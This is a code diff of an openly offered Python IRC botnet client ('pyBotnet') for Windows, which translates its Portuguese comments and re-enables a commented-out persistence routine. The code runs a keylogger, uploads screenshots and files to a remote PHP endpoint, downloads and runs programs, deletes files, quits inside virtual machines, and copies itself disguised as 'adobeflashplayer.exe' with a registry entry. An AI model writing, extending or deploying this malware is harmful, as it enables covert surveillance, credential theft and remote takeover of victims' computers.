@@ -1,37 +1,36 @@
 #!/usr/bin/python
 #-*- coding: utf-8 -*-
 # pyBotnet v1.0 
-# author msOliver
 # creation date: 17/03/2016
 # Social media:  https://www.facebook.com/msoliveroriginal
 # Youtube Channel: https://www.youtube.com/channel/UCp9cDi1ibw7D8bjFMm6BZHQ
 import sys
 import os
-import socket # Para a funcao conn(): && ipLocal():
-import platform # Para pegar o nome do computador variavel pcName
-import random # Para adicionar numeros aleatorios para variavel pcName
-import glob # Para a funcao listFile(): listar arquivos no computador
-import re # Para a funcao getPublicIp(): Ip Location
-from urllib import urlopen # Para a funcao getPublicIp(): Ip Location
-import requests # Para a funcao upload(): Upload Arquivos
-import urllib,urllib2 # Para a funcao download(): download de arquivos via http
-import subprocess # Para a funcao run(): para execultar programa
-import Image, ImageGrab, time, datetime # Para funcao screenshot(): printscreen - print tela
-import shutil # Para a funcao startup(): copia o server para um diretorio
-from _winreg import * # Para a funcao startup(): gravar no regedit
-import win32com.client # Para a funcao vmDetect()
-import pythoncom, pyHook, win32api, win32gui, win32con # Para a função Keylogger
-from threading import Timer # Para a função Keylogger
-from threading import Thread # Para a função Keylogger
+import socket # For function conn(): && ipLocal():
+import platform # For variable pcName
+import random # For variable pcName
+import glob # For function listFile(): list files on the computer
+import re # For function getPublicIp(): Ip Location
+from urllib import urlopen # For function getPublicIp(): Ip Location
+import requests # For function upload(): File Upload
+import urllib,urllib2 # For function download(): downloading files via http
+import subprocess # For function run(): to execute program
+import Image, ImageGrab, time, datetime # For function screenshot():
+import shutil # For function startup(): copy the bot to a directory
+from _winreg import * # For function startup(): register in regedit
+import win32com.client # For function vmDetect()
+import pythoncom, pyHook, win32api, win32gui, win32con # For function Keylogger
+from threading import Timer # For function Keylogger
+from threading import Thread # For function Keylogger
 #from allimport import *
 ircServer= "chat.freenode.net"	# Address Server Irc
 ircChanne= "#pythonbrs"			# Channel for Bot connect
 ircPwdCha= ""					# Password of Channel, if there enter the password or leave blank
 botAdmi= "msOliver"				# A name for the welcome help, Not obligatory.
 botPass= "12345"				# Not obligatory. A name for the welcome help
-dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe" 			# Path to where the bot will copy + name it, Use \ double to separate directories: \\
-urlFromUpload = "http://www.site.com.br/site/wp-cont/upload.php" 	# URL that contains the php ARRAY to receive files via upload
-urlFromUpShow = urlFromUpload.strip('http:upload.php')				# Variable that receives the URL to display uploaded files
+dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
+urlFromUpload = "http://www.site.com.br/upload.php"			# URL that contains the php ARRAY to receive files via upload
+urlFromUpShow = urlFromUpload.strip('http:upload.php')		# Variable that receives the URL to display uploaded files
 # keylogging function
 # originally by: Technic Dynamic, http://www.technicdynamic.com/
 #############################
@@ -207,7 +206,7 @@ def oneScreenshots():# screenshot function
 	saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
 	img.save(saveas)
 	sendMsg(ircChanne,  "..::Screenshot salvo::.. " + str(saveas) +  " ..:: Aguarde imagem sendo urpada::..")
-	#url = 'http://www.site.com.br/site/wp-cont/upload.php' #Arry Receber o arquivo 
+	#url = 'http://www.site.com.br/upload.php' #Arry Receber o arquivo 
 	files = {'file': open(saveas, 'rb')}
 	r = requests.post(urlFromUpload, files=files) #import requests
 	sendMsg(ircChanne, "..::Imagem urpado com sucesso para::.. http:"+urlFromUpShow + saveas)
@@ -224,7 +223,7 @@ def multipleScreenshots():
 def run():
 	if os.path.isfile(str(fileRun)) == True:
 		subprocess.call(['start', fileRun], shell=True)
-		sendMsg(ircChanne, fileRun + " execultado com sucesso.")
+		sendMsg(ircChanne, fileRun + " executado com sucesso.")
 	else:
 		sendMsg(ircChanne, fileRun + " arquivo nao existe.")
 def download():
@@ -242,12 +241,11 @@ def download():
 	else:
 		sendMsg(ircChanne, "Atencao: Falta [ http:// ] na url " + urlDown)
 def upload():
-	#url = 'http://www.site.com.br/site/wp-cont/upload.php' #Arry Receber o arquivo
+	#url = 'http://www.site.com.br/upload.php' #Arry Receber o arquivo
 	global urlFromUpload, urlFromUpShow
 	if os.path.exists(fileUp):
 		files = {'file': open(fileUp, 'rb')}
 		r = requests.post(urlFromUpload, files=files) #import requests
-		#sendMsg(ircChanne, "..::Arquivo urpado com sucesso::.. para " + "http://www.site.com.br/site/wp-cont/" + fileUp)
 		sendMsg(ircChanne, "..::Arquivo urpado com sucesso::.. para http:"+urlFromUpShow + fileUp)
 	else:
 		sendMsg(ircChanne, "O arquivo nao existe " + "[ " + fileUp + " ]")
@@ -279,12 +277,13 @@ def vmDetect():
 		else:
 			return 0
 def conn():
+#REFERENCIA http://stackoverflow.com/questions/25616545/python-irc-bot-not-returning-full-list-of-channels
     try:
         ircSock.connect((ircServer, 6665 ))
     except socket.error:
         conn()
     else:
-        ircSock.send(str.encode("useR "+ botNick +" "+ botNick +" "+ botNick +" :The Walking Dead\n"))
+        ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :The Walking Dead\n"))
         ircSock.send(str.encode("NICK "+ botNick +"\n"))
 def ping():
 	ircSock.send (str.encode("PONG :pingis\n"))
@@ -298,16 +297,16 @@ def quitIrc(chan):
     ircSock.send(str.encode("QUIT" + "\n"))
 def main():
 	global botAdmi, dir, ircSock, botNick, fileUp, urlDown, fileRun, maxPic, interval, delFile, logTime, logFileName, activeScreenshot
-	if vmDetect() == 0:#1:  # vmDetect , Verifica se o pc é uma maquina real ou virtual use 1 para detectar vms - 
+	if vmDetect() == 0:#1:  # Checks whether the PC is a real or virtual machine use 1 to detect vms
 		sys.exit()
-	#if os.path.isfile(dir) == False:
-	#    startup()
-	#else:
-	#	print "Erro"
+	if os.path.isfile(dir) == False:
+	    startup()
+	else:
+		print "Erro"
 	pcName = platform.node()
 	ircSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	botNick = pcName + "-" + str(random.randint(1, 10000))
-	#time.sleep(40) # Aguarda Inicialização da placa de rede
+	#time.sleep(40) # Wait Initialization of the network card - Uncomment the line
 	conn()
 	join(ircChanne)
 	login = False
@@ -323,7 +322,7 @@ def main():
 				p = ircMsgClean.split()
 				pwd = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <login> <senha>")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <login> <senha>")
 			else:
 				if pwd != botPass:
 					sendMsg(ircChanne, "ERROR: Senha Invalida, ou voce nao pode logar")
@@ -350,7 +349,7 @@ def main():
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <help> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <help> <" + botNick +">")
 			else:
 				if id == botNick:
 					sendMsg(ircChanne, "!!- Bem Vindo -!! " + botAdmi)
@@ -393,7 +392,7 @@ def main():
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <dir> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <dir> <" + botNick +">")
 			else:
 				if id == botNick:
 					sendMsg(ircChanne, "Diretorio atual do bot: " + sys.path[0])	
@@ -402,7 +401,7 @@ def main():
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <ls> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <ls> <" + botNick +">")
 			else:
 				if id == botNick:
 					listFile()
@@ -411,7 +410,7 @@ def main():
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <ip> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <ip> <" + botNick +">")
 			else:
 				if id == botNick:
 					yx = getPublicIp()
@@ -423,7 +422,7 @@ def main():
 				fileUp = p[4]
 				id = p[5]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <upload> <Arquivo> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <upload> <Arquivo> <" + botNick +">")
 			else:
 				if fileUp == fileUp and id == botNick:
 					sendMsg(ircChanne, "..::Aguarde Arquivo sendo urpado::..")
@@ -434,7 +433,7 @@ def main():
 				urlDown = p[4]
 				id = p[5]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <download> <link> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <download> <link> <" + botNick +">")
 				#sendMsg(ircChanne,  "use: <download> <link> <" + botNick +">")
 			else:
 				if urlDown == urlDown and id == botNick:
@@ -445,7 +444,7 @@ def main():
 				fileRun = p[4]
 				id = p[5]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <run> <programa> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <run> <programa> <" + botNick +">")
 			else:
 				if fileRun == fileRun and id == botNick:
 					run()
@@ -454,7 +453,7 @@ def main():
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <screenshot> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <screenshot> <" + botNick +">")
 			else:
 				if id == botNick:
 					oneScreenshots()
@@ -467,7 +466,7 @@ def main():
 				interval = p[5]
 				id = p[6]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <multiscreens> <quantidade> <intervalo> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <multiscreens> <quantidade> <intervalo> <" + botNick +">")
 			else:
 				if maxPic == maxPic and interval == interval and id == botNick:
 					multipleScreenshots()
@@ -479,7 +478,7 @@ def main():
 				delFile = p[4]
 				id = p[5]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <delete> <arquivo> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <delete> <arquivo> <" + botNick +">")
 			else:
 				if delFile == delFile and id == botNick:
 					delFileY()
@@ -489,7 +488,7 @@ def main():
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <info> <bots> ou <info> <" + botNick +">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <info> <bots> ou <info> <" + botNick +">")
 			else:
 				if id == botNick or id == allBots:
 					infoBot()				
@@ -501,7 +500,7 @@ def main():
 				activeScreenshot = p[6]
 				id = p[7]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintax Invalida::.. use: <keylogger> <tempo> <arquivo> <0/1 print> <"+botNick+">")
+				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <keylogger> <tempo> <arquivo> <0/1 print> <"+botNick+">")
 			else:
 				if logTime == logTime and logFileName == logFileName and activeScreenshot == activeScreenshot and id == botNick:
 					sendMsg(ircChanne, "..::Keylogger Iniciado::..")
